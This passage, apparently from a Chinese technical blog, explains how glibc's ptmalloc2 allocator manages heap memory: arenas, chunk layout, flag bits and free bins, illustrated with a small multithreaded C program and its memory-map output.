<h2 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h2><p>无论是 malloc 函数还是 free 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数。这些函数背后的系统调用主要是 (s)brk 函数以及 mmap, munmap 函数。<br>如下图所示，我们主要考虑对堆进行申请内存块的操作。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-140843.jpg" alt=""></p>
<h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk (program break location, the program break is the address of the first location beyond the current end of the data region, <a href="https://en.wikipedia.org/wiki/Sbrk)的大小来向操作系统申请内存。" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Sbrk)的大小来向操作系统申请内存。</a></p>
<p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启ASLR，两者的具体位置会有所不同</p>
<ul>
<li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。</li>
<li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li>
</ul>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-141046.jpg" alt=""></p>
<h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>malloc 会使用 mmap来创建独立的匿名映射段。匿名映射的目的主要是可以申请以0填充的内存，并且这块内存仅被调用进程所使用。</p>
<h2 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h2><p>在原来的 dlmalloc 实现中，当两个线程同时调用malloc时，只有一个线程可以进入临界区，因为freelist数据结构是在所有可用线程之间共享的。因此，内存分配在多线程应用程序中需要时间，导致性能下降。<br>而在ptmalloc2中，当两个线程同时调用malloc时，会立即分配内存，因为每个线程维护一个单独的堆段，因此维护这些堆的freelist数据结构也是分开的。<br>这种为每个线程维护单独的堆和freelist数据结构的行为称为per thread arena。<br>在新的实现中，所有的线程共享多个堆。</p>
<p>这里给出一个例子。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Per thread arena example. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in thread 1\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in thread 1\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After free in thread 1\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">pthread_t</span> t1;</span><br><span class="line">        <span class="keyword">void</span>* s;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="keyword">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to per thread arena example::%d\n"</span>,getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in main thread\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in main thread\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After free in main thread\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Thread creation error\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = pthread_join(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Thread join error\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>第一次申请之前， 没有任何任何堆段。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0 </span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure></p>
<p><strong>第一次申请后， 从下面的输出可以看出，堆段被建立了，并且它就紧邻着数据段</strong>，这说明malloc的背后是用brk函数来实现的。同时，需要注意的是，我们虽然只是申请了1000个字节，但是我们却得到了0x0806c000-0x0804b000=0x21000个字节的堆。这说明虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。<strong>我们称这一块连续的内存区域为 arena。此外，我们称由主线程申请的内存为 main_arena。</strong> 后续的申请的内存会一直从这个 arena 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加brk的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0 </span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure></p>
<p><strong>在主线程释放内存后</strong>，我们从下面的输出可以看出，其对应的 arena 并没有进行回收，而是交由glibc来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0 </span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure></p>
<p><strong>在第一个线程malloc之前</strong>，我们可以看到并没有出现与线程1相关的堆，但是出现了与线程1相关的栈。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">Before malloc in thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0 </span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure></p>
<p><strong>第一个线程malloc后</strong>， 我们可以从下面输出看出线程1的堆段被建立了。而且它所在的位置为内存映射段区域，同样大小也是132KB(b7500000-b7521000)。因此这表明该线程申请的堆时，背后对应的函数为mmap函数。同时，我们可以看出实际真的分配给程序的内存为1M(b7500000-b7600000)。而且，只有132KB的部分具有可读可写权限，这一块连续的区域成为<strong>thread arena</strong>。</p>
<p><strong>注意：</strong><br><strong>当用户请求的内存大于128KB时，并且没有任何arena有足够的空间时，那么系统就会执行mmap函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。</strong></p>
<p><strong>ptmalloc在开始时，若请求的空间小于 mmap 分配阈值(mmap threshold，默认值为 128KB)时，主分配区会调用 sbrk()增加一块大小为 (128 KB + chunk_size) align 4KB 的空间作为 heap。非主分配区会调用 mmap 映射一块大小为 HEAP_MAX_SIZ(E 32位系统上默认为1MB，64位系统上默认为64MB)的空间作为sub-heap。<br>当用户请求内存分配时，首先会在这个区域内找一块合适的chunk给用户。当用户释放了heap 中的chunk时，ptmalloc又会使用fast bins 和 bins 来组织空闲 chunk。以备用户的下一次分配。<br>若需要分配的 chunk 大小小于 mmap 分配阈值，而 heap 空间又不够，则此时主分配区会通过 sbrk()调用来增加 heap 大小，非主分配区会调用mmap映射一块新的sub-heap，也就是增加top chunk的大小，每次heap增加的值都会对齐到4KB。<br>当用户的请求超过mmap 分配阈值，并且主分配区使用sbrk()分配失败的时候，或是非主分配区在 top chunk 中不能分配到需要的内存时，ptmalloc 会尝试使用 mmap()直接映射一 块内存到进程内存空间。使用 mmap()直接映射的 chunk 在释放时直接解除映射，而不再属于进程的内存空间。任何对该内存的访问都会产生段错误。而在 heap 中或是 sub-heap 中分 配的空间则可能会留在进程内存空间内，还可以再次引用(当然是很危险的)。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">Before malloc in thread 1</span><br><span class="line">After malloc and before free in thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0 </span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0 </span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0 </span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>
<p><strong>在第一个线程释放内存后</strong>， 我们可以从下面的输出看到，这样释放内存同样不会把内存重新给系统。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">Before malloc in thread 1</span><br><span class="line">After malloc and before free in thread 1</span><br><span class="line">After free in thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0 </span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0 </span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0 </span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>
<h2 id="Arena"><a href="#Arena" class="headerlink" title="Arena"></a>Arena</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-092939.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-092947.jpg" alt=""><br>在我们之前介绍的例子中，无论是主线程还是新创建的线程，在第一次申请内存时，都会有独立的arena。那么会不会每个线程都有独立的arena呢？下面我们就具体介绍。</p>
<h3 id="arena-数量"><a href="#arena-数量" class="headerlink" title="arena 数量"></a>arena 数量</h3><p>对于不同系统，arena数量的约束如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For 32 bit systems:</span><br><span class="line">     Number of arena = 2 * number of cores.</span><br><span class="line">For 64 bit systems:</span><br><span class="line">     Number of arena = 8 * number of cores.</span><br></pre></td></tr></table></figure></p>
<p>显然，不是每一个线程都会有对应的 arena。至于为什么64位系统，要那么设置，我也没有想明白。此外，因为每个系统的核数是有限的，当线程数大于核数的二倍（超线程技术）时，就必然有线程处于等待状态，所以没有必要为每个线程分配一个arena。</p>
<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>与 thread 不同的是，main_arena 并不在申请的 heap 中，而是一个<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1740" target="_blank" rel="noopener">全局变量</a>，在 libc.so 的数据段。</p>
<h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>程序刚开始执行时，每个线程是没有 heap 区域的。当其申请内存时，就需要一个结构来记录对应的信息，而heap_info 的作用就是这个。而且当该heap的资源被使用完后，就必须得再次申请内存了。此外，一般申请的heap 是不连续的，因此需要记录不同heap之间的链接结构。</p>
<p><strong>该数据结构是专门为从 Memory Mapping Segment 处申请的内存准备的，即为非主线程准备的。</strong></p>
<p>主线程可以通过 sbrk() 函数扩展 program break location 获得（直到触及Memory Mapping Segment），只有一个heap，没有 heap_info 数据结构。</p>
<h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>该结构用于管理堆，记录每个 arena 当前申请的内存的具体状态，比如说是否有空闲chunk，有什么大小的空闲chunk 等等。无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。由于 thread 的 arena 可能有多个，malloc state结构会在最新申请的arena中。</p>
<p>注意，main arena 的 malloc_state 并不是 heap segment 的一部分，而是一个全局变量，存储在 libc.so 的数据段。</p>
<h2 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h2><p>以下结构体代表在内存中的一块特定堆块(chunk)，有些结构体成员对于已分配和未分配的堆块有着不同的意义。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>                <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="Allocated-chunk"><a href="#Allocated-chunk" class="headerlink" title="Allocated chunk"></a>Allocated chunk</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-092353.jpg" alt=""><br>一个使用中的chunk(使用中，就是指还没有被free掉)在内存中的样子如图所示。<br>在图中，chunk 指针指向一个 chunk 的开始，一个 chunk 中包含了用户请求的内存区域和相关的控制信息。<br><strong>图中的 mem 指针才是真正返回给用户的内存指针。</strong><br>chunk 的第二个域的最低一位为 P，它表示前一个块是否在使用中，<strong>P 为 0 则表示前一个 chunk 为空闲（并非指链表中的前一个堆块，而是连续内存中的前一块内存），这时 chunk 的第一个域 prev_size 才有效</strong>，prev_size 表示前一个 chunk 的 size，程序可以使用这个值来找到前一个 chunk 的开始地址。<br>当 P 为 1 时，表示前一个 chunk 正在使用中，prev_size无效，程序也就不可以得到前一个 chunk 的大小。不能对前一个 chunk 进行任何操作。ptmalloc 分配的第一个块总是将 P 设为 1，以防止程序引用到不存在的区域。<br>Chunk的第二个域的倒数第二个位为M，他表示当前chunk是从哪个内存区域获得的虚拟内存。M 为 1 表示该 chunk 是从 mmap 映射区域分配的，否则是从 heap 区域分配的。<br>Chunk 的第二个域倒数第三个位为 A，表示该 chunk 属于主分配区或者非主分配区，如果属于非主分配区，将该位置为 1，否则置为 0。 </p>
<h3 id="Free-chunk"><a href="#Free-chunk" class="headerlink" title="Free chunk"></a>Free chunk</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-092300.jpg" alt=""><br>空闲 chunk 在内存中的结构如图所示。<br>当 chunk 空闲时，其 M 状态不存在，只有 AP 状态。<br>原本是用户数据区的地方存储了四个指针，指针 fd 指向后一个空闲的 chunk，而 bk 指向前一个空闲的 chunk，ptmalloc 通过这两个指针将大小相近的 chunk 连成一个双向链表。<br>对于 large bin 中的空闲 chunk，还有两个指针，fd_nextsize 和 bk_nextsize，这两个指针用于加快在 large bin 中查找最近匹配的空闲 chunk。<br>不同的 chunk 链表又是通过 bins 或者 fastbins 来组织的</p>
<h3 id="chunk-中的空间复用"><a href="#chunk-中的空间复用" class="headerlink" title="chunk 中的空间复用"></a>chunk 中的空间复用</h3><p>为了使得 chunk 所占用的空间最小，ptmalloc 使用了空间复用，一个 chunk 或者正在被使用，或者已经被 free 掉，所以 chunk 的中的一些域可以在使用状态和空闲状态表示不同的意义，来达到空间复用的效果。<br>以 32 位系统为例，空闲时，一个 chunk 中至少需要 4 个 size_t(4B)大小的空间，用来存储 prev_size，size，fd 和 bk (见上图)，也就是 16B， chunk 的大小要对齐到 8B。<br>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域肯定是无效的。所以实际上，这个空间也可以被当前 chunk 使用。<br>这听起来有点不可思议， 但确实是合理空间复用的例子。故而实际上，一个使用中的 chunk 的大小的计算公式应该是: in_use_size = (用户请求大小+ 8 - 4 ) align to 8B，<strong>这里加 8 是因为需要存储 prev_size 和 size， 但又因为向下一个 chunk“借”了 4B，所以要减去 4。</strong><br>最后，因为空闲的 chunk 和使用中的 chunk 使用的是同一块空间。所以肯定要取其中最大者作为实际的分配空间。即最终的分配空间 chunk_size = max(in_use_size, 16)。这就是当用户请求内存分配时，ptmalloc 实际需要分配的内存大小。</p>
<h2 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h2><p>bin是一个由<strong>空闲</strong>(未分配)堆块组成的(双向或单向)链表。Bins根据所包含的区块大小进行区分：</p>
<ul>
<li>Fast bin</li>
<li>Unsorted bin</li>
<li>Small bin</li>
<li>Large bin</li>
</ul>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-120518.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-123923.jpg" alt=""><br>用户 free 掉的内存并不是都会马上归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。<br>当用户进行下一次分配请求时，ptmalloc 会首先试图在空闲的 chunk 中挑选一块给用户，这样就避免了频繁的系统调用，降低了内存分配的开销。<br>ptmalloc 将相似大小的 chunk 用双向链表链接起来，这样的一个链表被称为一个 bin。<br>Ptmalloc 一共 维护了 128 个 bin（<strong>实际上bin[0]和bin[127]都不存在，bin[1]是unsorted bins</strong>)，并使用一个数组来存储这些 bin(如下图所示)。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-124631.jpg" alt=""><br>数组中的 bin 依次介绍如下</p>
<ul>
<li>第一个为 unsorted bin，字如其面，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。</li>
<li>索引从 2 到 63 的 bin 称为 small bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为2个机器字长，即32位相差8字节，64位相差16字节。</li>
<li>small bins 后面的 bin 被称作 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的chunk 按 fd 指针的顺序从大到小排列。相同大小的chunk同样按照最近使用顺序排列。</li>
</ul>
<p>当空闲的 chunk 被链接到 bin 中的时候，ptmalloc 会把表示该 chunk 是否处于使用中的 标志 P 设为 0(注意，这个标志实际上处在下一个 chunk 中)，同时 ptmalloc 还会检查它前后的 chunk 是否也是空闲的，如果是的话，ptmalloc 会首先把它们合并为一个大的 chunk， 然后将合并后的 chunk 放到 unstored bin中。</p>
<p>此外，上述这些bin的排布都会遵循一个原则：<strong>任意两个物理相邻的空闲chunk不能在一起。</strong></p>
<p>需要注意的是，并不是所有的 chunk 被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些小的 chunk 先放到 fast bins 的容器内。而且，<strong>fastbin 容器中的 chunk 的使用标记总是被置位的，所以不满足上面的原则。</strong></p>
<ul>
<li><strong>Fast bins 是小内存块的高速缓存，当一些大小小于等于64 字节的 chunk 被回收时，首先会放入 fast bins 中，在分配小内存时，首先会查看 fast bins 中是否有合适的内存块，如果存在，则直接返回 fast bins 中的内存块，以加快分配速度。</strong></li>
